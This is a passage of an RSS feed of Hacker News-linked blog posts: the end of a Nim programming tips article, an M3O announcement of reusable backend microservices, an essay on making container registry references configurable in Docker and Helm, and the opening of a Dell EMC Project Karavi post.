      <td>87,812</td>
      <td>1.00</td>
    </tr>
    <tr>
      <td>stripped</td>
      <td>36,352</td>
      <td>0.41</td>
    </tr>
    <tr>
      <td>compresed</td>
      <td>18,944</td>
      <td>0.22</td>
    </tr>
  </tbody></table>

  <figcaption>Table 2 â€” Comparison of compiled executable sizes for a minimal
  Nim program (with and without debug symbols, and without debug symbols and
  compressed with UPX)</figcaption>
</figure>

<p>It is important to note that the presence of debug symbols in a binary <em>does
not</em> affect its runtime performance whatsoever. This is because debug symbols
are not even loaded into memory during normal use, only when debugging. So
really it only affects the space the executable takes up on disk.</p>

<p>In case youâ€™re wondering, youâ€™ll still get nice Nim stack traces with
a stripped binary if you compiled it with <code>-d:debug</code> or <code>--stacktrace=on
--linetrace=on</code> (more on that in the next tip).</p>

<h3 id="2--release-builds-with-exception-logging">2 &nbsp; Release builds with exception logging</h3>

<p>Creating a release build with <code>-d:release</code> gives you a speed boost, but at
the price of turning off stack traces (among other things). This can be a problem
if youâ€™re trying to implement a crash-reporting mechanism for end-users,
which involves surrounding your main method with a <code>try/except</code> block and
writing exceptions with stack traces to a log file.</p>

<p>Luckily, you donâ€™t need to ship debug builds to your users just to be able to
do that; you can still use <code>-d:release</code> to get most optimisation benefits
while turning stack traces back on with <code>--stacktrace=on --linetrace=on</code>. The
performance of the resulting binary might be a bit slower, but you know, life
is all about the right trade-offs.</p>

<h3 id="3--switching-to-arcorc">3 &nbsp; Switching to ARC/ORC</h3>

<p>Nim defaults to the <code>refc</code> garbage collector (deferred reference counting with
a mark &amp; sweep phase for cycle collection), which works very well, even for
soft-realtime requirements. But did you know that there has been a brand new
GC introduced in 1.2.x that offers reduced memory footprint and even better
performance in most cases?</p>

<p>This is ARC, the fully deterministic Automatic Reference Counting garbage
collector. Switching to ARC is as easy as supplying the <code>--gc:arc</code> option to
the compiler. Itâ€™s a drop-in replacement for most programs. Depending on your
program, you might want to use it with the <code>--deepcopy:on
--hint[Performance]:off</code> options.</p>

<p>ARC has many other benefits, including hard realtime support, shared heaps
between threads, and simplifying the C FFI.  Mind you, ARC cannot handle
cyclic data structures. But it has a big brother called ORC, which adds support
for that.</p>

<p>You can learn more about ARC and ORC in this <a href="https://nim-lang.org/blog/2020/10/15/introduction-to-arc-orc-in-nim.html">excellent blog
post</a>
on the Nim website.</p>

<h3 id="4--executable-icons-on-windows-mingw">4 &nbsp; Executable icons on Windows (MinGW)</h3>

<p>Setting the icon for Windows executables is probably easier with Visual
Studio, but anyhow, here are the instructions for gcc/MinGW that Iâ€™m using.</p>

<ol>
  <li>
    <p>First, youâ€™ll need to generate an <code>.ico</code> file that contains your icon image
in multiple resolutions. Thereâ€™s lots of online tools for that, and thereâ€™s
also ImageMagickâ€”this is outside the scope of this article.</p>
  </li>
  <li>
    <p>Once you have your image, youâ€™ll need to create a resource definition <code>.rc</code>
file that references your icon file. I used <code>appicon</code> here for the ID, but
you can use any other string, it doesnâ€™t matter:</p>

    <div><div><pre><code> appicon ICON "gridmonger.ico"
</code></pre></div>    </div>
  </li>
  <li>
    <p>The next step is to create the resource object file from the <code>.rc</code> file
(<code>windres</code> is included in MinGW):</p>

    <div><div><pre><code> windres gridmonger.rc -O coff -o gridmonger.res
</code></pre></div>    </div>
  </li>
  <li>
    <p>Finally, we need to instruct the compiler to link the resource file
into our program:</p>

    <div><div><pre><code> <span>when</span> <span>defined</span><span>(</span><span>windows</span><span>):</span>
   <span>{.</span><span>link</span><span>:</span> <span>"icons/gridmonger.res"</span><span>.}</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="5--debug-echo-in-windows-gui-programs-mingw">5 &nbsp; Debug echo in Windows GUI programs (MinGW)</h3>

<p>This will be a rather short one but it took me a while to figure it out. It
turns out that when you link against the Windows libraries by passing
<code>-mwindows</code> to the linker (<code>-L:-mwindows</code>), you wonâ€™t be able to print stuff
the console with <code>echo</code> anymore.</p>

<p>â€œBut this is a useless tip, of course you need to link against the Windows
libs in a GUI program!â€, I hear you say. Well, not necessarily. In GLFW apps,
for example, you can get away with not linking against the Windows libs in
many cases. For instance, in Gridmonger I only need <code>-mwindows</code> so I can open
the standard open and save system dialogs. In my debug builds, I donâ€™t link
against the Windows libs and I conditionally turn the calls to the dialog
functions to no-ops, and then I can do my debug printing to the console.</p>



<h3 id="6--using-keyword">6 &nbsp; â€˜usingâ€™ keyword</h3>

<p>The
<a href="https://nim-lang.org/docs/manual.html#statements-and-expressions-using-statement">using</a>
keyword is a very useful, but often forgotten language feature. It helps to
cut down on redundancy when creating method call style APIs, or when passing
context objects around.</p>

<div><div><pre><code><span># Without `using`</span>
<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>:</span> <span>Level</span><span>,</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>,</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span><span>)</span> <span>=</span> <span>...</span>

<span># With `using`</span>
<span>using</span> <span>l</span><span>:</span> <span>Level</span>
<span>using</span> <span>a</span><span>:</span> <span>var</span> <span>AppContext</span>

<span>proc </span><span>getFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>;</span> <span>a</span><span>):</span> <span>Floor</span> <span>=</span> <span>...</span>
<span>proc </span><span>setFloor</span><span>*</span><span>(</span><span>l</span><span>;</span> <span>row</span><span>,</span> <span>col</span><span>:</span> <span>Natural</span><span>,</span> <span>f</span><span>:</span> <span>Floor</span><span>;</span> <span>a</span><span>)</span> <span>=</span> <span>...</span>
</code></pre></div></div>

<h3 id="7--opening-urls-in-the-default-browser">7 &nbsp; Opening URLs in the default browser</h3>

<p>Did you know that the standard library has
a <a href="https://nim-lang.org/docs/browsers.html">browsers</a> module for the sole
purpose of opening URLs in the OS default browser in a cross-platform way?
In fact, Iâ€™ve been using Nim for 4 years and Iâ€™ve learned about this just
recently!</p>

<p>This is very handy if you want to navigate the user to a programâ€™s website
from a desktop app, or to open local HTML documentation.</p>

<h3 id="8--cross-platform-home-and-config-directories">8 &nbsp; Cross-platform home and config directories</h3>

<p>Similarly, <a href="https://nim-lang.org/docs/os.html#getHomeDir">getHomeDir()</a> and
<a href="https://nim-lang.org/docs/os.html#getConfigDir">getConfigDir()</a> from the
<a href="https://nim-lang.org/docs/os.html">os</a> module are super handy if you need to
handle configuration files or program data in a cross-platform way.</p>

<h3 id="9--debug-dumping-expressions">9 &nbsp; Debug dumping expressions</h3>

<p>However sophisticated modern development tools might be, just echoing stuff to
the console is still one of the easiest and quickest ways to debug a program.
But writing things like <code>echo "foo: ", foo</code> for the hundredth time gets old
really fast. The <a href="https://nim-lang.org/docs/sugar.html#dump.m%2Cuntyped">dump</a>
macro in the standard <a href="https://nim-lang.org/docs/sugar.html">sugar</a> module
helps with exactly that.</p>

<p>Make sure to check out the other useful additions the module introduces!</p>

<div><div><pre><code><span>import</span> <span>sugar</span>

<span>var</span>
  <span>a</span> <span>=</span> <span>42</span>
  <span>s</span> <span>=</span> <span>"frobnicate"</span>
  <span>x</span> <span>=</span> <span>7</span>

<span>dump</span><span>(</span><span>a</span><span>)</span>
<span>dump</span><span>(</span><span>s</span><span>)</span>
<span>dump</span><span>(</span><span>a</span> <span>+</span> <span>x</span><span>)</span>

<span># prints:</span>
<span># a = 42</span>
<span># s = frobnicate</span>
<span># a + x = 49</span>
</code></pre></div></div>

<h3 id="10--measuring-elapsed-time">10 &nbsp; Measuring elapsed time</h3>

<p>Although you can use the regular <a href="https://nim-lang.org/docs/times.html">times</a>
module to measure elapsed time, to do it properly you really need a monotonic
timer. Such a thing has been added to the standard library recently in the
form of <a href="https://nim-lang.org/docs/monotimes.html">std/monotimes</a>.</p>

<div><div><pre><code><span>import</span> <span>os</span>
<span>import</span> <span>std</span><span>/</span><span>monotimes</span>
<span>import</span> <span>times</span>

<span>proc </span><span>durationToFloatMillis</span><span>*</span><span>(</span><span>d</span><span>:</span> <span>Duration</span><span>):</span> <span>float64</span> <span>=</span>
  <span>inNanoseconds</span><span>(</span><span>d</span><span>).</span><span>float64</span> <span>*</span> <span>1e-6</span>

<span>let</span> <span>t0</span> <span>=</span> <span>getMonoTime</span><span>()</span>
<span>sleep</span><span>(</span><span>10</span><span>)</span> <span># do something for a while</span>
<span>let</span> <span>d</span> <span>=</span> <span>getMonoTime</span><span>()</span> <span>-</span> <span>t0</span>

<span>echo</span> <span>durationToFloatMillis</span><span>(</span><span>d</span><span>)</span>
</code></pre></div></div>

<h3 id="11--dealing-with-openarrays">11 &nbsp; Dealing with openarrays</h3>

<p><a href="https://nim-lang.org/docs/manual.html#types-open-arrays">Openarrays</a>
are a handy Nim feature that allow you to â€¦</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/">https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</a></em></p>]]>
            </description>
            <link>https://blog.johnnovak.net/2020/12/21/nim-apocrypha-vol1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505492</guid>
            <pubDate>Tue, 22 Dec 2020 12:09:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A new API backend for the jamstack]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25505353">thread link</a>) | @asim
<br/>
December 22, 2020 | https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Micro</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-12-22">22 Dec 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Your new API backend for the jamstack</h1> -->

        <section>
            <p><br>
Last month we talked about a new architecture pattern, <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">Netlify for the frontend, Micro for the backend</a>. As the frontend has evolved towards being dominated by the <a href="https://jamstack.org/">Jamstack</a>, we believe the backend also requires a fundamental shift in itâ€™s design and consumption model.</p>

<p>Netlify, while largely agnostic of framework usage, has promoted decomposition of the traditional stack to something more driven by microservices and APIs. 
<a href="https://m3o.com/">Micro</a> has long been an advocate for that, both as an <a href="https://github.com/micro/micro">open source</a> project and now as a hosted platform called 
<a href="https://blog.m3o.com/2020/11/05/m3o-open-to-the-world.html">M3O</a>.</p>

<h2 id="get-started">Get Started</h2>

<p>If you want to skip right to getting started head to the <a href="https://m3o.com/signup">m3o.com/signup</a>.</p>

<h2 id="evolution-of-the-backend">Evolution of the Backend</h2>

<p>But whatâ€™s more, weâ€™re seeing a need from the backend to evolve beyond providing traditional infrastructure services. Itâ€™s no longer enough to just focus on
authentication, configuration, storage, hosting, etc. What we really need is higher level APIs that provide business level value.</p>

<p>The most prime examples are Stripe, Twilio, Sengrid and Segment. Who focus on APIs for finance, communications and analytics. AWS, Google and others are providing 
coverage for infra level APIs.</p>

<p>What we really need is the next layer of abstraction. We need the building blocks for new types of APIs and services. Micro acts as a platform for these 
services and now we want to move into offering the next level of value add services.</p>

<h2 id="composition-and-value-add">Composition and Value Add</h2>

<p>Whatâ€™s clear when working with microservices is that thereâ€™s an ability to decompose systems into smaller domain specific reusable services and then aggregate back 
up into many forms as value add services, products and then businesses.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/building-blocks.png">
</center>

<p>As you can see in this image and probably from common experience, most businesses are composed of the same generic building blocks from the infrastructure all the 
way up. Itâ€™s only when we get to the business specific requirements that we need our own services to handle that logic.</p>

<p>Itâ€™s insane that most of us continue to build the same systems on the backend over and over rather than reusing and building on the foundations of each others 
work. GitHub enabled this for open source at an accelerated pace but weâ€™ve yet to see the same emerge for business logic, services and APIs.</p>

<p>Itâ€™s now our goal to facilitate this with a single unified platform and reusable services.</p>

<h2 id="introducing-micro-services">Introducing Micro Services</h2>

<p>Today weâ€™re unveiling <a href="https://github.com/micro/services"><strong>Micro Services</strong></a>, a set of reusable building block services which can be used on the Micro Platform 
whether youâ€™re self hosting the <a href="https://github.com/micro/micro">open source</a> project or using our managed platform <a href="https://m3o.com/">M3O</a>.</p>

<p>Browse directly to <a href="https://github.com/micro/services">github.com/micro/services</a> if you want to read through the code or kick the tyres locally.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/micro-services.png">
</center>



<h3 id="services-included">Services Included</h3>

<p>Weâ€™re including 10 services from the get go (available in <a href="https://github.com/micro/services">github.com/micro/services</a>):</p>

<ul>
  <li><strong>Helloworld</strong> - The canonical helloworld to kick the tyres</li>
  <li><strong>Chat</strong> - Messaging as an api to embed anywhere</li>
  <li><strong>Posts</strong> - The foundation for a headless CMS</li>
  <li><strong>Comments</strong> - Add comments to posts or replies to your app</li>
  <li><strong>Tags</strong> - Categorise your posts for quick searching</li>
  <li><strong>Feeds</strong> - Crawl and index RSS feeds into your posts service</li>
  <li><strong>Location</strong> - Realtime gps point location tracking and search</li>
  <li><strong>Messages</strong> - An inbox for private messages and related</li>
  <li><strong>Notes</strong> - Simple todo notes, lists, etc</li>
  <li><strong>Users</strong> - User management and authentication</li>
</ul>

<p>All of the above services are available to explore and deploy when logged in on <a href="https://web.m3o.com/">web.m3o.com</a>.</p>

<h2 id="getting-started-on-the-web">Getting Started on the Web</h2>

<p>As part of this announcement weâ€™re releasing our new Web UI to quickly get up and running.</p>

<p>Head to <a href="https://m3o.com/signup">m3o.com/signup</a> to get started.</p>

<h3 id="deploy-services">Deploy Services</h3>

<p>When logged in you can head to the <a href="https://web.m3o.com/service/new">new service page</a> to explore and deploy any of the above 
plus any other Micro services youâ€™ve built yourself directly from a public git url.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/new-service.png">
</center>

<h3 id="explore-api-endpoints">Explore API Endpoints</h3>

<p>After selecting and running a service, an instance of it gets deployed to your namespace. Once the service deploys itâ€™s API endpoints can be explored and 
called directly from the web UI along with its running status and logs.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/callendpoint.png">
</center>


<h3 id="embed-services-using-microjs">Embed Services using Micro.JS</h3>

<p>All the services running can also be called from Javascript easily (currently only a vanilla JS client is available, more is coming), using what we call 
<strong>micro.js</strong>. See the embed tab for the code.</p>

<center>
  <img src="https://blog.m3o.com/assets/images/microjs.png">
</center>
<p><br>
Micro.js provides a simple way to call services running on the platform, including handling authentication using a popup for login/registration, 
making it easy to add your micro services anywhere on the web.</p>

<p>For those interested in a typescript implementation of login, signup, user read and token refreshing API calls, the 
<a href="https://github.com/micro/web/blob/main/src/app/user.service.ts">relevant web dashboard code</a> can be useful.</p>

<h2 id="build-your-own">Build Your Own</h2>

<p>While weâ€™re providing some services out of the box, Micro is an all encompassing ecosystem that includes a platform and framework for development 
in Go. We want to encourage everyone to get involved, whether itâ€™s writing services for your own consumption or contributing them back to 
<a href="https://github.com/micro/services">github.com/micro/services</a> for everyone elseâ€™s consumption too.</p>

<h2 id="learn-more">Learn More</h2>

<p>To learn more about Micro itself head to open source website <a href="https://micro.mu/">micro.mu</a> or join us in <a href="https://slack.m3o.com/">slack</a>.</p>

        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://blog.m3o.com/2020/12/22/your-new-api-backend-for-the-jamstack.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505353</guid>
            <pubDate>Tue, 22 Dec 2020 11:47:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is It Time to Change How We Reference Container Images?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505315">thread link</a>) | @based2
<br/>
December 22, 2020 | https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/ | <a href="https://web.archive.org/web/*/https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2938">
	
	<!-- .entry-header -->

	
		<div data-first_letter="E">
		
<p>Every package manager has the ability to reference <strong><em>a thing</em></strong>, without having to reference <strong><em>where to get that thing</em></strong>. The <strong><em>where</em></strong> is a separate configuration. </p>



<p>Lets say you want to install react. <code>npm install react </code>will pull from npmjs.com</p>



<p>Letâ€™s say you donâ€™t want your development team to be dependent on the public registry, for reliability and security reasons, you want all packages to be maintained within your company, Acme Rockets. Or, you have a bunch of private packages that you donâ€™t want to be public.</p>



<p>By reconfiguring the default registry:</p>



<p><code>npm config set registry <a href="https://npm.example.com/">https://npm.acme-rockets.io/</a></code></p>



<p>the same <code>npm install react </code>now comes from your private registry.</p>



<p>So, why do we bake in registry names to our image deployment manifests?</p>



<p><strong><code>kube-deploy.yaml</code></strong></p>



<pre><code>apiVersion: apps/v1kind: Deployment<br>metadata:<br>&nbsp; name: nginx-deployment<br>&nbsp; labels:<br>&nbsp;&nbsp;&nbsp; app: nginx<br>spec:<br>&nbsp; replicas: 3<br>&nbsp; selector:<br>&nbsp;&nbsp;&nbsp; matchLabels:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app: nginx<br>&nbsp; template:<br>&nbsp;&nbsp;&nbsp; metadata:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; labels:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; app: nginx<br>&nbsp;&nbsp;&nbsp; spec:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; containers:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - name: nginx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; image: <strong><span>registry.acme-rockets.io/nginx:1.14.2</span></strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ports:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - containerPort: 80</code></pre>



<h2>Dockerâ€™s Progressive Disclosure Design</h2>



<p>Depending on the example you look at, you may not see a registry name. In the below example, nginx is referenced, but no registry name is provided. </p>



<p>&nbsp;&nbsp;&nbsp; spec:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; containers:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; â€“ name: nginx<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; image: <strong>nginx:1.14.2</strong></p>



<p>Docker has been highly successful because of their developer focus. They make the simple things simple, while enabling the harder elements by progressively adding parameters. </p>



<p>This does make the simple running of hello-world as simple as:</p>



<p><code>docker run hello-world</code></p>



<p>Notice, thereâ€™s no tag, not even the dreaded <code>:latest</code>. <code>:latest </code>is assumed when no tag is provided. Likewise, you donâ€™t even think about a registry when running hello-world. It magically appears if not already on the local machine. Another great aspect of the docker experience; the passive caching.</p>



<h2>Smooth Transitions and Cliffs</h2>



<p>This is where it gets a bit more interesting. Rather than provide a configuration option for the registry, docker requires the registry as a parameter to the image reference. To use our <code>registry.acme-rockets.io</code> reference, we canâ€™t simply say:</p>



<p><code>docker config registry=registry.acme.rockets.io</code></p>



<p>We must embed the registry as part of the image reference:</p>



<p><code>docker run registry.acme-rockets.io/nginx:1.14.2</code></p>



<p>At first, this doesnâ€™t appear to be a huge issue, as it does follow the progressive disclosure model, where the non-default simply requires additional information. Most container clients know to substitute docker.io when no registry name is provided. </p>



<h2>Complexity Manifesto</h2>



<p>Where this gets complex is balancing the use of public content in our private environments. While it seems pretty trivial to simply change the registry reference, even concatenating <code>registry.acme-rockets.io/</code> to <code>nginx:1.14.2</code>, the problem manifests itself when we start consuming public deployment artifacts.</p>



<p>Even our nginx sample above would default to pulling from Docker Hub. While fine for a demo, customers are looking to copy/paste, or simply consume as-is, without having to make changes.</p>



<p>If you have a large <code>kube-deploy.yaml</code> file, it may reference images from Docker Hub, gcr, quay, or other public registries like the recently announced GitHub Container Registry.</p>



<p>Are you expected to copy/replace all the references? How many people do? I can tell you from our Azure experiences that most donâ€™t, until they get burned. </p>



<h2>The Pros and Cons of Helm Chart Usage</h2>



<p>As we were evaluating the impact of the Docker Terms of Service changes, and helping customers understand the value of keeping content they depend upon under their own control, we focused on 3 aspects:</p>



<ul><li>Are all the 1st Party Azure Services pulling from Azure infrastructure?</li><li>Are customers pulling from Docker Hub, or other public registries that may be impacted by outages from DNS, CDN or other frailties of the internet?</li><li>Does the Azure documentation promote customers importing and maintaining public content into their privately controlled registry?</li></ul>



<p>We quickly realized it wasnâ€™t that simple, as if that were so simple.</p>



<p>Customers highly benefit from using Helm Charts to deploy â€œapplicationsâ€, â€œapplication componentsâ€ or â€œinfrastructure servicesâ€. For instance, customers that use cert-manager may follow the <a rel="noreferrer noopener" href="https://cert-manager.io/docs/installation/kubernetes/#installing-with-helm" target="_blank">helm instructions </a>to:<code> </code></p>



<pre><code>helm install cert-manager jetstack/cert-manager</code></pre>



<p>Helm got the private repository model correct. To get the <code>jetstack</code> version of <code>cert-manager</code>, youâ€™re guided to configure the <code>jetstack</code> repository: </p>



<pre><code>helm repo add jetstack https://charts.jetstack.io</code></pre>



<p>Where the problem manifests is how helm charts reference images. </p>



<p>Looking at <a rel="noreferrer noopener" href="https://github.com/helm/charts/blob/master/stable/cert-manager/templates/deployment.yaml#L43" target="_blank">deployment.yaml</a>, we see the containers reference: </p>



<pre><code>containers:<br>  - name: {{ .Chart.Name }}<br>    image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"</code></pre>



<p>The <a rel="noreferrer noopener" href="https://github.com/helm/charts/blob/master/stable/cert-manager/values.yaml#L22" target="_blank">values.yaml</a> provides the actual references:</p>



<pre><code>image:<br>  repository: <strong>quay.io/</strong>jetstack/cert-manager-controller<br>  tag: v0.6.2</code></pre>



<p>While values can be set , this imposes a complexity that most are not utilizing to provide references to their managed copy of the <code>cert-manager-controller</code> image.</p>



<pre><code>helm upgrade cert-manager ./charts/cert-manager \ <br>  --install \<br>  --set .image.repository=registry.acme-rockets.io/jetstack/cert-manager-controller</code></pre>



<p>Further, there are many charts that donâ€™t make the image value, nor do users easily know all the values in the primary or sub-charts they must override.</p>



<h2>What To Do?</h2>



<p>As with most things, thereâ€™s what can we do today, and what can we do as we have more time.</p>



<p>What we can do today:</p>



<h3>Docker Run: With Env Vars</h3>



<p>By simply extracting the registry name, even for a Docker Hub reference, we can see a simple change can unlock greater flexibility:</p>



<pre><code>REGISTRY_NAME=<br>docker run ${REGISTRY_NAME}hello-world</code></pre>



<p>To run hello-world from our acme-rockets registry:</p>



<pre><code>REGISTRY_NAME=registry.acme-rockets.io/<br>docker run ${REGISTRY_NAME}hello-world</code></pre>



<p><strong>Note: </strong>the <strong>/ </strong>is configured on the <code>REGISTRY_NAME</code>, as a blank registry would cause a failure when pulling from Docker Hub.</p>



<pre><code><span># blank for docker hub</span><br>REGISTRY_NAME=<br>docker run ${REGISTRY_NAME}hello-world <br><span># becomes</span><br>docker run /hello-world <br><span>docker: invalid reference format.</span></code></pre>



<h3>Dockerfiles: Abstract the Registry Reference with Build Args</h3>



<p>Docker added <a rel="noreferrer noopener" href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg" target="_blank">build-args</a> for just this purpose:</p>



<pre><code><strong>Dockerfile:</strong><br>ARG REGISTRY_NAME=mcr.microsoft.com/<br>FROM ${REGISTRY_NAME}dotnet/core/runtime</code></pre>



<p>Using the above, you can use commands like <a href="https://aka.ms/acr/import" target="_blank" rel="noreferrer noopener">az acr import</a> to import the <code>mcr.microsoft.com/dotnet/core/runtime</code> image to <code>registry.acme-rockets.io/dotnet/core/runtime</code></p>



<p>Using <a rel="noreferrer noopener" href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg" target="_blank">build-args</a>, you can then run the following command without having to change the dockerfile:</p>



<pre><code><span># Set an env var for simplicity </span>REGISTRY_NAME=registgry.acme-rockets.io/ <br><span># Build the new hello-world image, in the same registry as our imported base image: <br></span>docker build \<br>  -t ${REGISTRY_NAME}hello-world:1 \<br>  --build-arg ${REGISTRY_NAME} \<br>  .</code></pre>



<h3>Helm Chart Values â€“ Registry by Convention</h3>



<p>While helm repo supports customizable repositories, thereâ€™s no default mechanism for abstracting the registry. </p>



<p>Helm Charts are essentially <a rel="noreferrer noopener" href="https://blog.gopheracademy.com/advent-2017/using-go-templates/" target="_blank">go templates</a>. So, we just need a standard parameter model for the registry.</p>



<p>An alternative, which is arguably just another level of abstractions could be setting a standard of abstracting the registry name by convention. One that could transcend all sub-charts as well.</p>



<p><strong>deployment.yaml:</strong></p>



<pre><code>containers:<br>  - name: {{ .Chart.Name }}<br>    image: "<strong>{{ .Values.image.registry }}</strong>{{.Vlaues.image.repository}}:{{ .Values.image.tag }}"</code></pre>



<p><strong>values.yaml:</strong></p>



<pre><code>image:<br><strong>  registry: quay.io/</strong><br>  repository: jetstack/cert-manager-controller<br>  tag: v0.6.2</code></pre>



<p>The simplicity here is more akin to the progressive disclosure model. In most cases, the user would imply provide the registry name. If they import source images to the same path within their private registry, no other parameter changes are required:</p>



<pre><code>helm upgrade cert-manager ./charts/cert-manager \ <br>  --install \<br>  --set .image.registry=registry.acme-rockets.io/</code></pre>



<p>When charts reference multiple images, or even sub-charts, by setting this one registry parameter, we get similar package manager abstractions where we just have need to provide the unique registry name. Everything else remains the same.</p>



<h2>The Long Run</h2>



<p>To be fair, all the above items are things that we can do today, but what we can do today is not what weâ€™d like to do tomorrow. </p>



<p>The question is whether itâ€™s time to lift the registry name as a configuration.</p>



<h3>A collection of 1, or More</h3>



<p>The challenge is weâ€™ll likely have multiple registries we need to work with. We may want to build from a shared base-artifact registry, and build to our teams dev registry. In this case, changing the single default wont provide the flexibility needed.</p>



<p>However, we could lift the named reference pattern, along with a default registry. </p>



<p><strong>Wild hair idea warning: these ideas are 5 mins worth of thought for how to specify multiple registries. Iâ€™m sure we can do better.</strong></p>



<p>Weâ€™ll build a hello-world image, with a dockerfile that uses the default registry:</p>



<pre><code><strong>Dockerfile:</strong><br>FROM dotnet/core/runtime<br>...</code></pre>



<p>Weâ€™ll configure the default registry, along with a target registry:</p>



<pre><code><code>docker configure --default-registry mcr.microsoft.com</code><p>docker configure --add-registry target base-images.acme-rockets.io</p></code></pre>



<p>We now build our image, with a dockerfile we wonâ€™t change, using the target registry moniker :// for tagging the new image:</p>



<pre><code>docker build --t target://hello-world:42 .</code></pre>



<h2>Change Takes Time, and a First Step</h2>



<p>A change as impactful as making registries configurable across a growing suite of tools from container builders to container hosts will take a while. Weâ€™ll need to get some concensus on the patterns, including support for multiple registries. Weâ€™ll need the various projects to agree and commit to doing the actual coding. And, weâ€™ll need to wait for all of this to be deployed across the â€¦</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/">https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/</a></em></p>]]>
            </description>
            <link>https://stevelasker.blog/2020/10/21/is-it-time-to-change-default-registry-references/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505315</guid>
            <pubDate>Tue, 22 Dec 2020 11:41:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dell EMC: Introducing project Karavi extending the Kubernetes CSI capabilities]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505240">thread link</a>) | @based2
<br/>
December 22, 2020 | https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/ | <a href="https://web.archive.org/web/*/https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-7315">
	<section>
<p><span>The Kubernetes Eco-system, is growing rapidly and so far, where it comes to storage integration, the only way to integrate was via the CSI plugin which I blogged about <a href="https://volumes.blog/2018/12/13/tech-previewing-our-upcoming-xtremio-integration-with-kubernetes-csi-plugin/">here</a><br>
</span></p>
<p><span>But, as we get more and more customers who are adopting Kubernetes, itâ€™s only natural that they will want more and more functionality to be presented, far above and beyond what CSI is capable of..<br>
</span></p>
<p><span>Enter <span><strong>Project Karavi<br>
</strong></span></span></p>
<p><img src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing1.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing1.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><span><br>
</span></p>
<p><span>The ultimate source of wisdom, aka, Wikipedia, tells us that Karavi is an island in Greek and we thought it will be a cool name to leverage to explain what we are doing beyond just CSI and data protection, itâ€™s important to note that for us, Karavi is a journey that will covers many aspects and this is the beginning of this journey..<br>
</span></p>
